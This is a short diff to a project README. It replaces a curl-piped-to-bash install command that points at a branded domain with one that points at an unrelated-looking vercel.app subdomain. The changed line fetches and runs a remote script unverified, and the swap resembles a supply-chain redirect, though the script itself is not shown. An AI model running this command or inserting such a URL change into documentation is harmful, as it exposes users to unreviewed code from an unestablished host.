@@ -22,7 +22,7 @@
 ### Install (macOS / Linux)
 
 ```bash
-curl -sL https://get.iknowaguy.ai/install.sh | bash
+curl -sL https://website-ochre-sigma-97.vercel.app/install.sh | bash
 ```
 
 ### Or via npm
